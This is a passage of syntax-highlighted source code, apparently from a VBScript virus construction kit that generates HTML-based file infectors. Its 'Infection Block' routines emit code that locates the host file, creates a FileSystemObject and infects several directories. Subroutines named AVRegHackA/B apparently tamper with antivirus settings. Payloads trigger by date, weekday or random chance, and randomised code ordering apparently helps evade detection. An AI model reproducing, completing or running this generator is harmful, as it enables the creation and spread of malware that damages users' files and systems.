            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HackedRegA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AVRegHackA</span><span class="sc0">
                </span><span class="sc7">HackedRegA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HackedRegB</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AVRegHackB</span><span class="sc0">
                </span><span class="sc7">HackedRegB</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0"> 
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VCodeChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc3">call</span><span class="sc0"> </span><span class="sc7">RandInsertTxtHost</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">PayLoadChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">VCodeChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HackedRegA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HackedRegB</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CustomExecuteCodeEnd</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">OR</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'----------------------------------------Infection Block-----------------------------------------
</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VCodeCheck</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">Vinfo.InfProb</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.InfOffline.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"location.protocol = ""file:"""</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.InfProb</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Every"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Day"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Day(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.DayValInf.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Week"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"WeekDay(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.InfWeek.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Misc"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VInfo.InfLine.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Rand"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Int(("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.InfMax.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" * Rnd) + 1) = 1"</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">      

        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">OR</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandomAndAdd</span><span class="sc6">(</span><span class="sc7">BaseString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc6">)</span><span class="sc0">       
            </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">

        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.TrigInfect.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.TrigPlace</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Before"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PayLoadCheck</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InitialiseInfect</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.TrigInfect.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.TrigPlace</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"After"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PayLoadCheck</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">OR</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InitialiseInfect</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = CreateObject(""Scripting.FileSystemObject"")"</span><span class="sc0">
                </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertCreateTxt</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertFindHost</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">FoundParent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetParentFolderName("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
                </span><span class="sc7">FoundParent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertDirInf</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">FoundParent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">InsertedCurrent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">InsertedCurrent</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.InfCurrent.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarHostPath</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">InsertedCurrent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertDirInf</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">InsertedCurrent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">DirNum</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertFindHost</span><span class="sc0">
    </span><span class="sc1">'FindHostStyle = 1 or 2
</span><span class="sc0">    </span><span class="sc1">'1 = Get rid of "File:" first. 2 = Change "/" first
</span><span class="sc0">    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Vinfo.InfCurrent.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">FindHostStyle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">FoundHostType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">FindHostStyle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">FoundHostA</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = Replace(location.href, ""file:///"", """")"</span><span class="sc0">
            </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = Replace("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", ""/"", ""\"")"</span><span class="sc0">
                </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">else</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">FoundHostA</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = Replace(location.href, ""/"", ""\"")"</span><span class="sc0">
            </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = Replace("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", ""file:\\\"", """")"</span><span class="sc0">
                </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc7">FoundHostA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertCreateTxt</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.CreateRange.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.FileRoutine</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Default"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTxtRng</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = document.body.createTextRange"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">RandInsertTxtHost</span><span class="sc0">
    </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.InfProb</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertFindHost</span><span class="sc0">
            </span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.InfProb</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertCreateTxt</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertDirInf</span><span class="sc0">
    </span><span class="sc7">DirNum</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">DirNum</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.DirHard.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">DirNum</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VInfo.Dir1.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir1.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.Dir1.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc6">)</span><span class="sc0">
